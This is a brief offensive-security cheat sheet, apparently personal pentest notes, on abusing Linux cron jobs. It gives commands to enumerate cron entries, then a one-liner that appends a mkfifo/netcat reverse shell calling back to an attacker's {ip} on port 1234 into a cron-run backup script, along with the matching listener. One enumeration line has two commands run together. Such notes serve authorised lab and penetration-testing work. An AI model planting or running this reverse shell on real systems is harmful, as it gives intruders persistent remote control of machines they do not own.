# Cron jobs

_<mark style="background-color:purple;">**Enumerate cron jobs**</mark>_

```powershell
ls -lah /etc/cron*crontab -l
sudo crontab -l
grep "CRON" /var/log/syslog
```

_<mark style="background-color:purple;">**add a reverse shell to cronjob**</mark>_

```powershell
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 1234 >/tmp/f" >> user_backups.sh
```

`nc -lvnp 1234`
